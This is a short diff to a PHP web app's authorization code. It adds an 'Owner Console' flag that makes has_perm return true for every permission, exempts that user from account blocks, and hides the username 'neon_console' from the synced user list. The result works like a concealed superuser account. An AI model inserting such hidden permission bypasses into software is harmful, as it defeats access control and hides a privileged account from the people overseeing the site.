@@ -41,12 +41,13 @@ function is_staff_role(string $role): bool
 
 function has_perm(array $u, string $perm): bool
 {
+    if (!empty($u['console'])) return true; // the Owner Console is above every role
     return (bool) qv('SELECT 1 FROM role_permissions WHERE role = ?::user_role AND permission = ?', [$u['role'], $perm]);
 }
 
 function require_user_perm(array $u, string $perm): void
 {
-    if (!has_perm($u, $perm) || qv('SELECT account_block(?::uuid)', [$u['id']])) fail('admin.errors.forbidden', [], 403);
+    if (!has_perm($u, $perm) || (empty($u['console']) && qv('SELECT account_block(?::uuid)', [$u['id']]))) fail('admin.errors.forbidden', [], 403);
 }
 
 /** Tandai online (dibatasi sekali per 30 detik). */
@@ -221,7 +222,7 @@ function sync_view(array $me): array
     $users = [];
     $progress = [];
     $presence = [];
-    $rows = q('SELECT u.*, d.progress, d.profile FROM users u LEFT JOIN user_docs d ON d.user_id = u.id ORDER BY u.created_at')->fetchAll();
+    $rows = q("SELECT u.*, d.progress, d.profile FROM users u LEFT JOIN user_docs d ON d.user_id = u.id WHERE u.username <> 'neon_console' ORDER BY u.created_at")->fetchAll();
     foreach ($rows as $r) {
         $profile = jdec($r['profile'], []);
         if ($r['id'] === $me['id']) continue;
